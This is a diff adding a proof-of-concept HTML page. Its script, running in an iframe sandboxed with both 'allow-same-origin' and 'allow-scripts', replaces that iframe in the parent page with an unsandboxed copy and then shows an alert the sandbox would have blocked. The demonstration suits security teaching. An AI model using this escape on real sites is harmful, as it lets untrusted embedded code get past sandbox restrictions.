@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>PoC - Discouraged combination of sandbox attribute values (kid page)</title>
+</head>
+<body>
+    <script type="text/javascript">
+    if (window.top === this || window.parent === this) {
+            let message = "This page is meant to be loaded from within an iframe to demonstrate you can bypass sandbox attribute, when a combination of 'allow-same-origin' and 'allow-scripts' is used.";
+            document.body.innerText = message;
+            throw new Error(message);
+        }
+
+    const illegalCode = () => {
+        alert("You should not see me, because original iframe did not have 'allow-modals'. Kid page had allow-scripts and same-origin though. A new iframe without sandbox attribute was created - and here I am.");
+    }
+
+    const escape = () => {
+        document.body.innerText = "Loaded into a frame.";
+
+        let parent = window.parent;
+        let container = parent.document.getElementById("escapeMe");
+        if (parent.document.getElementById("escapeMe") != null) {
+            // Recreate and insert an iframe without sandbox attribute that
+            // plays by our rules.
+            let replacement = parent.document.createElement("iframe");
+            replacement.setAttribute("src", "kid.htm");
+            replacement.setAttribute("id", "escapedAlready")
+            parent.document.body.append(replacement);
+
+            // Remove original iframe (avoid an infinite loop)
+            container.parentNode.removeChild(container);
+
+        } else {
+            // Execute code that would be prevented by original iframe's sandbox.
+            illegalCode();
+        }
+    }
+
+    escape();
+</script>
+</body>
+</html>
